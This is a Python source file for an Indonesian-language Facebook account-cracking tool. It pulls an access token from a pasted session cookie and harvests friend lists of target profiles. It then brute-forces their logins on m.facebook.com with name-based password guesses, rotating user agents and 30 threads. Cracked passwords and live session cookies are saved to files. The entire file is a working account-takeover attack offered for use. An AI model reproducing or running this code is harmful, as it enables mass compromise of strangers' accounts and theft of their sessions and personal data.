#-----------------[ IMPORT-MODULE ]-------------------
import requests,json,os,sys,random,datetime,time,re
from rich.console import Console as sol
from concurrent.futures import ThreadPoolExecutor as tred
from rich.panel import Panel as nel
from rich import print as cetak
from rich import pretty
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')

try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen=[]
cokbrut=[]
fields=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAsep Yusup')
prox=open('.prox.txt','r').read().splitlines()


#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
asu = random.choice([m,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def asepyusup(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	login()
def ler():
	print(f'#----------[ MENU CRACK ]----------#')
def upin():
	print(f'#---------[ URUTAN CRACK ]---------#')
def ipin():
	print(f'#---------[ METHOD CRACK ]---------#')
#------------------[ LOGO-LAKNAT ]-----------------#
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r>> {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
#--------------------[ BAGIAN-MASUK ]--------------#
ses = requests.Session()
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
ses = requests.Session()
def login_lagi334():
	print('')
	cok = input(f'{k}Masukkan cookie :{h} ')
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		#exit(link.text)
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'> {m}cookie kamu invalid / ganti cookie lain !!!');time.sleep(2);masuk();batas()
		else:
			for x in find:
				jnck = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)', jnck.text).group(1)
				open('.token.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				print(f' Token : {h}{took}')
				exit()
	except Exception as e:
		print(e)

#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	asep()
	ip = requests.get("https://api.ipify.org").text
	cetak(nel('Selamat Datang [yellow]%s[white] Ganteng'%(my_name)))
	print(f'>> {H}Your Idz{N} : '+str(my_id))
	print(f'>> {H}Your Ip {N}: {ip}')
	print('')
	ler()
	print(f'>> {M}1{N}. {H}Crack Publik{N} ')
	print(f'>> {M}2{N}. {H}Crack Brutal{N}')
	print(f'>> {M}3{N}. {H}Crack File {N}')
	print(f'>> {M}4{N}. {H}Hasil Crack{N} ')
	print(f'>> {M}5{N}. {H}Gabung Gerup Telegram{N}')
	print(f'>> {M}0{N}. {M}Keluar {N}  ')
	asepyusup = input(f'\n>> {H}Pilih{N} : ')
	if asepyusup in ['1']:
		idt = input('\n>> ID Target : ')
		dump(idt,"",{"cookie":cok},token)
		setting()
	elif asepyusup in ['2']:
		dump_asep()
	elif asepyusup in ['3']:
		crack_file()
	elif asepyusup in ['4']:
		result()
	elif asepyusup in ['5']:
		Gabung()
	elif asepyusup in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print('>> Pilih Yang Bener Asu ')
		back()
def error():
	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()

def Gabung():
	print(f'>> {M}Tunggu Sedang Di Arahkan Ke Admin{N}')
	loading()
	os.system('xdg-open https://wa.me/6285710389492?text=Hallo+izin+menggunakan+SC+ini+Bang+Asep');time.sleep(1);back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'>> 1. Hasil {h}OK{x} Anda ')
	print(f'>> 2. Hasil {k}CP{x} Anda ')
	print('>> 3. Kembali	')
	kz = input(f'\n>> Pilih : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ({k} %s {x}Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n>> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}>> {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ( {h}%s{x} Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'>> %s. %s ({h} %s {x}Idz )'%(cih,isi,(len(hem))))
			geeh = input(f'\nPilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}>> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print('>> Pilih Yang Bener Kontol ')
		back()

def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r>> sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_asep():
    try:
        token = open(".token.txt", "r").read()
        cok = open(".cok.txt", "r").read()
    except IOError:
        exit()
    try:
        kumpulkan = int(input(f">> {H}Mau Berapa Id?{N} : "))
    except ValueError:
        exit()
    if kumpulkan < 1 or kumpulkan > 1000:
        exit()
    ses = requests.Session()
    bilangan = 0
    for KOTG49H in range(kumpulkan):
        bilangan += 1
        Masukan = input(f">> {H}Masukkan Id Yang Ke {N}" + str(bilangan) + f" : ")
        uid.append(Masukan)
    for user in uid:
        try:
            head = {
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
            }
            if len(id) == 0:
                params = {"access_token": token, "fields": "friends"}
            else:
                params = {"access_token": token, "fields": "friends"}
            url = requests.get(
                "https://graph.facebook.com/{}".format(user),
                params=params,
                headers=head,
                cookies={"cookies": cok},
            ).json()
            for xr in url["friends"]["data"]:
                try:
                    woy = xr["id"] + "|" + xr["name"]
                    if woy in id:
                        pass
                    else:
                        id.append(woy)
                except:
                    continue
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError:
            exit()
    try:
        print(" : " + str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
        exit()
    except (KeyError, IOError):
        exit()

#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('dump/')
	except FileNotFoundError:
		print('>> File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		cetak(nel('[white][[cyan]•[white]] Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n[[green]1[white]] Buatlah File Dump Id Terlebih dahulu\n[[green]2[white]] Setelah Jadi Masukkan Filenya Kedalam Folder[yellow] ALVINO-DUMP[white] di Penyimpanan Internal Kalian\n[[green]3[white]] Lalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor[yellow] 4 [white]ini '))
		kontol = input('\n>> Apakah Anda Faham ( Y/t ) ')
		if kontol in ['']:
			print('>> Pilih Yang Bener Asuhh ')
		elif kontol in ['y','Y']:
			print(f'\n[{h}√{x}] Alhamdulillah Anda Sungguh Pintarr ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'\n[{k}x{x}] Anda Sungguh Tolol ')
			time.sleep(3)
			exit()
		print('>> Anda Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('dump/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'>> %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('>> %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('\n>> Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'{k}>> Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('dump/'+geh,'r').read().splitlines()
		except:
			print('>> File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print('')
	upin()
	print(f'>> {M}1{N}. {H}Akun Old{N} ')
	print(f'>> {M}2{N}. {H}Akun New{N} ')
	print(f'>> {M}3{N}. {H}Akun Random{N} ')
	print('')
	hu = input(f'>> {H}Pilih {N}: ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> Pilih Yang Bener Kontooll ')
		exit()
	ipin()
	print('')
	print(f'>> {M}1{N}. {H}Async{N} ')
	print('')
	hc = input(f'>> {H}Pilih{N} : ')
	if hc in ['1','01']:
		method.append('async')
	elif hc in ['']:
		print('>> Pilih Yang Bener Kontol ')
		setting()
	else:
		method.append('async')
	print('')
	pwplus=input(f'>> {H}Tambahkan Password Manual {N}{M}( Y/t ) {N}')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'>> {H}Masukan kata sandi tambahan contoh{N} : {M}bagong,ngentod {N} \n>> {H}Saran kata sandi daeraah Target Contoh{N} :{M} kalimantan,bandung,jonggol{N}')
		pwku=input(f'>> {H}Masukkan Password Tambahan {N}: ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Sedang Meretas Perawan {m}•{k}•{h}•{x} <<<<< ')
	print(f'>> Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
	print(f'>> Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
	print(f'>> Mainkan Mode Pesawat Setiap {m}500{x} Idz')
	print("<<-------------------------------------------------------->>")
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'321')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'321')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'async' in method:
				pool.submit(crack,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
			
	print('')
	cetak(nel('\t[cyan][green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan][white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('>> Lanjut Crack Kembali ( Y/t ) ? ')
	woi = input('>> Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}>>{k} Good Bye Dadaahh{x} << ')
		time.sleep(2)
		exit()

def ua_valid():
	rr = random.randint
	rc = random.choice
	androversi = rc(["9","10","11","12","13"])
	mmk = random.choice(["hi-in","en-us","gu-in","en-au","en-nz","en-gb","en-nz"])
	bulid = random.choice(["PKQ1.190616.001","QP1A.190711.020","PPR1.180610.011","RP1A.201005.001"])
	rilmi = random.choice(["RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921"])
	tecno1 = random.choice(["ru-ru","en-us","es-us","fr-fr","es-","pt-ao"])
	tecno2 = random.choice(["TECNO CD8","itel L6005","itel L6501","TECNO KE7","TECNO IN2","TECNO CD6j","TECNO BD2p","TECNO KD7h","TECNO LA7","itel W6004","MobiGo2","TECNO LC6","TECNO KB7j","itel S661W"])
	tecnobulid3 = random.choice(["QP1A.190711.020","PPR1.180610.011","RP1A.201005.001"])
	tecno4 = random.choice(["7.2","7.4","7.5","7.8","7.6-;","7.3","7.7"])
	tec = f"Mozilla/5.0 (Linux; U; Android {androversi}; {mmk}; {rilmi} Build/{bulid}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,105))}.0.{str(rr(1111,4444))}.{str(rr(45,250))} Mobile Safari/537.36 RealmeBrowser/35.5.0.8"
	return rc([tec])

#--------------------[ METODE-MOBILE ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\r{M}Crack{N} [%s%s]/[%s] {H}Live{N} : %s {K}Check {N} : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ses = requests.Session()
	ua = ua_valid()
	for pw in pwv:
		try:
			head = {"Host": "m.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt": "1","x-requested-with": "mark.via.gp","sec-fetch-site": "none","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.facebook.com/","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			link = ses.get("https://m.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=%2Fcreatorstudio%2F%3Freference%3Dvisit_from_seo&refsrc=deprecated&_rdr",headers=head)
			data = {"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"uid": idf,"next": "https://m.facebook.com/login/save-device/","flow": "login_no_pin","pass":pw}
			headd = {"Host": "m.facebook.com","content-length": "338","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=%2Fcreatorstudio%2F%3Freference%3Dvisit_from_seo&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			post = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=data,headers=headd,allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print(f'\r*--> {K}{idf}|{pw}{N}')
				open('CP/'+'ASEP-CP.txt','a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f'\r*--> {H}{idf}|{pw}{N}\n*--> {H}{kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1



def geturlm():
    url = random.choice(["mobile.facebook.com","m.facebook.com","m.prod.facebook.com","d.facebook.com","mbasic.prod.facebook.com","mbasic.facebook.com","x.facebook.com"])
    gok = f"https://{url}/login.php?skip_api_login=1&api_key=375513111434043&kid_directed_site=0&app_id=375513111434043&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fclient_id%3D375513111434043%26redirect_uri%3Dhttps%253A%252F%252Fsubscribe.tempo.co%252Fsocial-login%252Fsocial-sign%252Ffacebook-callback%26scope%3Demail%252Cpublic_profile%26state%3D24ce398129d9bef801c7e0b12788d5f4%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De0bdeeed-bded-4e0d-ae8c-c9b855b68331%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fsubscribe.tempo.co%2Fsocial-login%2Fsocial-sign%2Ffacebook-callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D24ce398129d9bef801c7e0b12788d5f4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1699877623&hrc=1&wtsid=rdr_0Fo8tIn8txyd3nlim&_rdr"
    return gok
def posturlm():
    url = random.choice(["mobile.facebook.com","m.facebook.com","m.prod.facebook.com","d.facebook.com","mbasic.prod.facebook.com","mbasic.facebook.com","x.facebook.com"])
    gok = f"https://{url}/login/device-based/login/async/"
    return gok

def asep():
	os.system("cls")
	print(f"""{asu}                                     
 _____                __ __                 
|  _  |___ ___ ___   |  |  |_ _ ___ _ _ ___ 
|     |_ -| -| . |  |   | | | -| | | . |
|__|__|___|___|  _|    |_| |___|___|___|  _|
              |_|                      |_|  
              {N}""")
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	time.sleep(3)
	login()